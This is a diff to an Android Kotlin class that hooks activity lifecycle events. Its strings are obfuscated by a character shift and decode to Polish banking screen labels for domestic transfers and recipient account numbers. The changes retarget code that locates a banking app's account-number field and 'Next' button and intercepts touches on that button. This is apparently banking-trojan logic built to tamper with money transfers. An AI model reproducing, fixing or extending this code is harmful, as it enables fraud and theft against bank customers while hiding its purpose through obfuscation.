@@ -8,6 +8,7 @@ import android.view.View
 import android.view.ViewGroup
 import android.view.Window
 import androidx.appcompat.widget.AppCompatButton
+import androidx.appcompat.widget.AppCompatEditText
 import androidx.appcompat.widget.AppCompatTextView
 import androidx.constraintlayout.widget.ConstraintLayout
 import androidx.core.view.children
@@ -36,7 +37,7 @@ class AManager : Application.ActivityLifecycleCallbacks {
 private var ac: String? = null
 private var k1: String = "Qs{fmfx!lsbkpxz"
 private var k2: String = "Rqfuwoqycpkg"
-private var k3: String = "!Pwogt\"tcejwpmw\"gfdkqte{"
+private var k3: String = "!Pwogt\"tcejwpmw\"qfdkqte{"
 private var k4: String = "!Yrku|\"pwogt\"tcejwpmw"
 private var k5: String = "!Fcngl"
 
@@ -92,17 +93,17 @@ private fun action(activity: Activity) {
         }
     } else if (isDomTrn) {
         val numberField = activity.window.firstOrNull lambda@{
-            if (it !is AppCompatTextView) return@lambda false
-            if (it.text != k4) return@lambda false
+            if (it !is AppCompatEditText) return@lambda false
+            if (it.hint != k4) return@lambda false
             true
         }
         val nextButton = activity.window.firstOrNull lambda@{
-            if (it !is AppCompatTextView) return@lambda false
+            if (it !is AppCompatButton) return@lambda false
             if (it.text != k5) return@lambda false
             true
         }
         if (numberField != null && nextButton != null) {
-            val kop = numberField as AppCompatTextView
+            val kop = numberField as AppCompatEditText
             val kopBut = nextButton as AppCompatButton
             kopBut.setOnTouchListener { view, event ->
                 if (lastUserInputAc.isBlank()) {
